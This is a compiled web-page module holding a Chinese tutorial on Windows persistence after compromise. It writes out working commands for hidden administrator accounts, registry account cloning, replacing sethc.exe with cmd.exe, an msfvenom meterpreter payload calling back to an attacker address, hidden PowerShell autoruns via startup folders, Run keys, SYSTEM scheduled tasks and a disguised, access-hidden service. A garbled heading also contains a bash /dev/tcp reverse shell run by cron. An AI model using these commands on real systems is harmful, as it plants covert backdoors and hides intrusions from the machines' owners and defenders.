import{_ as s,W as n,X as a,a1 as e}from"./framework-b6a07282.js";const t="/assets/1-5da86ed8.jpg",i="/assets/2-955f8ab2.jpg",c="/assets/3-6ba8559b.jpg",l="/assets/4-faf0a139.jpg",o="/assets/5-22a8bd72.jpg",p="/assets/6-d4d7acdd.jpg",r="/assets/7-65b17251.jpg",u="/assets/8-073dcce7.jpg",d={},m=e(`<h2 id="windows权限维持" tabindex="-1"><a class="header-anchor" href="#windows权限维持" aria-hidden="true">#</a> Windows权限维持</h2><ul><li>权限维持可以理解为我们在目标上安装了一个后门，权限维持的目的是保证自己的权限不会掉，一直控制住目标。</li></ul><h3 id="隐藏用户" tabindex="-1"><a class="header-anchor" href="#隐藏用户" aria-hidden="true">#</a> 隐藏用户</h3><h4 id="符号隐藏用户" tabindex="-1"><a class="header-anchor" href="#符号隐藏用户" aria-hidden="true">#</a> $符号隐藏用户</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>net user hacker$ Aa123456 /add 
net localgroup administrators hacker$ /add
仅仅在cmd里net user看不到，其他地方可看到
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><img src="`+t+'"><h4 id="注册表克隆用户" tabindex="-1"><a class="header-anchor" href="#注册表克隆用户" aria-hidden="true">#</a> 注册表克隆用户</h4><img src="'+i+'"><ol><li>导出hacker$用户的reg文件</li></ol><img src="'+c+'"><ol start="2"><li>将administrator中所对应的F值复制到hacker$的F值中</li></ol><img src="'+l+'"><ol start="3"><li>将hacker$所对应的数据导出</li></ol><img src="'+o+'"><ol start="4"><li>现在我们有了两个reg文件</li></ol><img src="'+p+`"><ol start="5"><li>删除hacker$用户，然后双击运行两个reg文件。用户仅可以在注册表中看见。</li></ol><h3 id="shift后门维持" tabindex="-1"><a class="header-anchor" href="#shift后门维持" aria-hidden="true">#</a> Shift后门维持</h3><ul><li>windwos的粘滞键是C:\\windows\\system32\\sethc.exe的程序，它本身是为不方便按组合键的人设计的。当按下5次shift后，就启动了粘滞键。</li><li>当我们未登陆系统时（停留在登录界面），系统还不知道我们将以哪个用户登录，这个时候连续按下5次shift，系统将会以system用户来运行sethc.exe这个程序。</li><li>我们可以把cmd.exe这个程序更名替换掉sethc.exe，在登陆界面连续按下5次shift，系统就会以system权限来运行cmd.exe。</li></ul><h4 id="xxxxxxxxxx-1-创建反弹后门vim-tmp-shell-shbash-i-dev-tcp-192-168-1-253-12345-0-1​2-更改权限chmod-755-tmp-shell-sh​3-编辑计划任务crontab-e-1-tmp-shell-sh​crontab-l-列出计划任务systemctl-status-crond-查看计划任务状态systemctl-start-crond-service-启动计划任务​4-攻击机执行监听nc-lvvp-12345shell" tabindex="-1"><a class="header-anchor" href="#xxxxxxxxxx-1-创建反弹后门vim-tmp-shell-shbash-i-dev-tcp-192-168-1-253-12345-0-1​2-更改权限chmod-755-tmp-shell-sh​3-编辑计划任务crontab-e-1-tmp-shell-sh​crontab-l-列出计划任务systemctl-status-crond-查看计划任务状态systemctl-start-crond-service-启动计划任务​4-攻击机执行监听nc-lvvp-12345shell" aria-hidden="true">#</a> xxxxxxxxxx 1.创建反弹后门vim /tmp/shell.shbash -i &gt;&amp;/dev/tcp/192.168.1.253/12345 0&gt;&amp;1​2.更改权限chmod 755 /tmp/shell.sh​3.编辑计划任务crontab -e*/1 * * * * /tmp/shell.sh​crontab -l //列出计划任务systemctl status crond //查看计划任务状态systemctl start crond.service//启动计划任务​4.攻击机执行监听nc -lvvp 12345shell</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.更改文件权限
takeown /f c:<span class="token punctuation">\\</span>windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>*.* /a /r /d y 注释：强制将当前目录下的所有文件及文件夹、子文件夹下的所有者更改为管理员组<span class="token punctuation">(</span>administrators<span class="token punctuation">)</span>

cacls c:<span class="token punctuation">\\</span>windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>*.* /T /E /G administrators:F 注释：在当前目录下的文件、子文件夹的NTFS权限上添加管理员组<span class="token punctuation">(</span>administrators<span class="token punctuation">)</span>完全控制权限<span class="token punctuation">(</span>并不删除原有所有NTFS权限设置<span class="token punctuation">)</span>

<span class="token number">2</span>.在命令行执行以下命令，将cmd.exe改名为sethc.exe并将原有的sethc.exe覆盖
copy C:<span class="token punctuation">\\</span>WINDOWS<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>cmd.exe C:<span class="token punctuation">\\</span>windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>sethc.exe

YES
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><img src="`+r+`"><h3 id="启动项维持" tabindex="-1"><a class="header-anchor" href="#启动项维持" aria-hidden="true">#</a> 启动项维持</h3><h4 id="组策略维持" tabindex="-1"><a class="header-anchor" href="#组策略维持" aria-hidden="true">#</a> 组策略维持</h4><ol><li>msf生成后门文件</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>msfvenom <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> windows <span class="token parameter variable">-p</span> windows/meterpreter/reverse_http <span class="token parameter variable">-e</span> x86/shikata_ga_nai <span class="token parameter variable">-i</span> <span class="token number">15</span> <span class="token parameter variable">-b</span> <span class="token string">&#39;\\x00&#39;</span> <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.1.253 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">3333</span> <span class="token parameter variable">-f</span> psh <span class="token parameter variable">-o</span> shell.ps1

再写个BAT启动
@echo off
powershell.exe <span class="token parameter variable">-w</span> hidden <span class="token parameter variable">-ExecutionPolicy</span> Bypass <span class="token parameter variable">-NoExit</span> <span class="token parameter variable">-File</span> C:<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>Administrator<span class="token punctuation">\\</span>Desktop<span class="token punctuation">\\</span>keep<span class="token punctuation">\\</span>shell.ps1
<span class="token builtin class-name">exit</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><img src="`+u+`"><p>然后将bat放在启动的脚本里。（该后门为system权限）</p><h4 id="启动文件夹维持" tabindex="-1"><a class="header-anchor" href="#启动文件夹维持" aria-hidden="true">#</a> 启动文件夹维持</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>直接把后门放在这些文件夹里即可，获取的权限为当前登陆的权限。
启动文件夹:
C: <span class="token punctuation">\\</span>ProgramData<span class="token punctuation">\\</span>Microsoft<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>Start Menu<span class="token punctuation">\\</span>Programs<span class="token punctuation">\\</span>Startup <span class="token comment">#系统级，需要system权限</span>
C: <span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>用户名<span class="token punctuation">\\</span>AppData<span class="token punctuation">\\</span>Roaming<span class="token punctuation">\\</span>Microsoft<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>Start<span class="token punctuation">\\</span>Menu<span class="token punctuation">\\</span>Programs<span class="token punctuation">\\</span>Startup <span class="token comment">#用户级 普通用户就可以</span>

组策略脚本启动文件夹：
C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>System32<span class="token punctuation">\\</span>GroupPolicy<span class="token punctuation">\\</span>Machine<span class="token punctuation">\\</span>Scripts<span class="token punctuation">\\</span>Startup
C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>System32<span class="token punctuation">\\</span>GroupPolicy<span class="token punctuation">\\</span>Machine<span class="token punctuation">\\</span>Scripts<span class="token punctuation">\\</span>Shutdown
C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>System32<span class="token punctuation">\\</span>GroupPolicy<span class="token punctuation">\\</span>User<span class="token punctuation">\\</span>Scripts<span class="token punctuation">\\</span>Logon
C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>System32<span class="token punctuation">\\</span>GroupPolicy<span class="token punctuation">\\</span>User<span class="token punctuation">\\</span>Scripts<span class="token punctuation">\\</span>Logoff

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="注册表维持" tabindex="-1"><a class="header-anchor" href="#注册表维持" aria-hidden="true">#</a> 注册表维持</h4><ul><li>Windows注册表存在的自启动后门较多，此类后门主要利用原理为将Payload文件植入具备自启动特性的注册 表中，这样Payload就会在计算机启动过程被执行。此处以较为经典的两类自启动项进行说明演示</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># HKEY_LOCAL_MACHINE类</span>
HKEY_CURRENT_USER<span class="token punctuation">\\</span>Software<span class="token punctuation">\\</span>Microsoft<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>CurrentVersion<span class="token punctuation">\\</span>Run
HKEY_CURRENT_USER<span class="token punctuation">\\</span>Software<span class="token punctuation">\\</span>Microsoft<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>CurrentVersion<span class="token punctuation">\\</span>RunOnce
HKEY_CURRENT_USER<span class="token punctuation">\\</span>SOFTWARE<span class="token punctuation">\\</span>Microsoft<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>CurrentVersion<span class="token punctuation">\\</span>RunOnceEx
HKEY_CURRENT_USER<span class="token punctuation">\\</span>Software<span class="token punctuation">\\</span>Microsoft<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>CurrentVersion<span class="token punctuation">\\</span>RunServices
HKEY_CURRENT_USER<span class="token punctuation">\\</span>Software<span class="token punctuation">\\</span>Microsoft<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>CurrentVersion<span class="token punctuation">\\</span>RunServicesOnce

<span class="token comment"># HKEY_CURRENT_USER类</span>
HKEY_CURRENT_USER<span class="token punctuation">\\</span>Software<span class="token punctuation">\\</span>Microsoft<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>CurrentVersion<span class="token punctuation">\\</span>Run
HKEY_CURRENT_USER<span class="token punctuation">\\</span>Software<span class="token punctuation">\\</span>Microsoft<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>CurrentVersion<span class="token punctuation">\\</span>RunOnce
HKEY_CURRENT_USER<span class="token punctuation">\\</span>SOFTWARE<span class="token punctuation">\\</span>Microsoft<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>CurrentVersion<span class="token punctuation">\\</span>RunOnceEx
HKEY_CURRENT_USER<span class="token punctuation">\\</span>Software<span class="token punctuation">\\</span>Microsoft<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>CurrentVersion<span class="token punctuation">\\</span>RunServices
HKEY_CURRENT_USER<span class="token punctuation">\\</span>Software<span class="token punctuation">\\</span>Microsoft<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>CurrentVersion<span class="token punctuation">\\</span>RunServicesOnce

reg <span class="token function">add</span> <span class="token string">&quot;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span> /v shell /t REG_SZ /d <span class="token string">&quot;C:\\Users\\Administrator\\Desktop\\shell<span class="token entity" title="\\1">\\1</span>.bat&quot;</span>

获取的权限为当前登陆的权限。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="计划任务维持" tabindex="-1"><a class="header-anchor" href="#计划任务维持" aria-hidden="true">#</a> 计划任务维持</h3><ul><li>计划任务是系统的常见功能，利用任务计划功能，可以将任何脚本、程序或文档安排在某个最方便的时间运行。任 务计划在每次系统启动的时候启动并在后台运行。</li><li>打开方式：taskschd.msc</li></ul><h4 id="使用schtasks" tabindex="-1"><a class="header-anchor" href="#使用schtasks" aria-hidden="true">#</a> 使用schtasks</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>、在每个任意用户登录中以SYSTEM的形式执行计划任务：
schtasks /create /tn 计划任务名 /tr <span class="token string">&quot;计划任务执行文件命令&quot;</span> /sc onlogon /ru System
<span class="token number">2</span>、在系统启动期间或用户会话处于非活动状态（空闲模式）时执行
schtasks /create /tn 计划任务名 /tr <span class="token string">&quot;计划任务执行文件命令&quot;</span> /sc onidle /i <span class="token number">30</span>
<span class="token number">3</span>、在系统启动的时候以SYSTEM的形式执行计划任务：
schtasks /create /tn 计划任务名 /tr <span class="token string">&quot;计划任务执行文件命令&quot;</span> /sc onstart /ru System
<span class="token number">4</span>、计划任务以 System 权限每10分钟运行一次
schtasks /create /tn 计划任务名 /tr <span class="token string">&quot;计划任务执行文件命令&quot;</span> /sc minute/mo <span class="token number">10</span> /ru system

<span class="token comment">#再系统开机的时候运行计划任务shell</span>
schtasks /create /tn shell /tr <span class="token string">&quot;C:\\Windows\\System32\\WindowsPowerShell<span class="token entity" title="\\v">\\v</span>1.0\\powershell.exe -w hidden -ExecutionPolicy Bypass -NoExit -File C:\\Users\\Administrator\\Desktop\\keep\\shell.ps1&quot;</span> /sc onstart /ru System

获取的权限为system权限。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="使用at" tabindex="-1"><a class="header-anchor" href="#使用at" aria-hidden="true">#</a> 使用at</h4><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>at 00:00 C:\\Users\\Administrator\\Desktop\\keep\\1.bat 设置每天0点执行计划任务
at 1 /delete 删除计划任务
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="使用powershell" tabindex="-1"><a class="header-anchor" href="#使用powershell" aria-hidden="true">#</a> 使用powershell</h4><h3 id="创建服务维持" tabindex="-1"><a class="header-anchor" href="#创建服务维持" aria-hidden="true">#</a> 创建服务维持</h3><ul><li>服务（即，以前的 NT 服务）使您能够创建在它们自己的 Windows 会话中可长时间运行的可执行应用程序。这些 服务可以在计算机启动时自动启动，可以暂停和重新启动而且不显示任何用户界面。这种服务非常适合在服务器上 使用，或任何时候，为了不影响在同一台计算机上工作的其他用户，需要长时间运行功能时使用。还可以在不同于 登录用户的特定用户帐户或默认计算机帐户的安全上下文中运行服务。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>、创建服务
sc create shell <span class="token assign-left variable">start</span><span class="token operator">=</span> auto <span class="token assign-left variable">binPath</span><span class="token operator">=</span> <span class="token string">&quot;cmd.exe /k powershell.exe -w hidden -ExecutionPolicy Bypass -NoExit -File C:\\Users\\Administrator\\Desktop\\keep\\shell.ps1&quot;</span> <span class="token assign-left variable">obj</span><span class="token operator">=</span> Localsystem

<span class="token number">2</span>、对该服务进行伪装
sc description <span class="token string">&quot;shell&quot;</span> <span class="token string">&quot;绝对安全的shell哈哈哈&quot;</span>

<span class="token number">3</span>、设置服务的自动启动
sc config <span class="token string">&quot;shell&quot;</span> <span class="token assign-left variable">start</span><span class="token operator">=</span> auto

<span class="token number">4</span>、然后启动该服务
net start <span class="token string">&quot;服务名&quot;</span>

<span class="token comment">#隐藏shell服务</span>
sc sdset shell <span class="token string">&quot;D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA) (A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY) (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</span>

<span class="token comment">#恢复隐藏的shell服务</span>
sc sdset shell <span class="token string">&quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA) (A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,43),v=[m];function h(k,b){return n(),a("div",null,v)}const g=s(d,[["render",h],["__file","Windows权限维持.html.vue"]]);export{g as default};
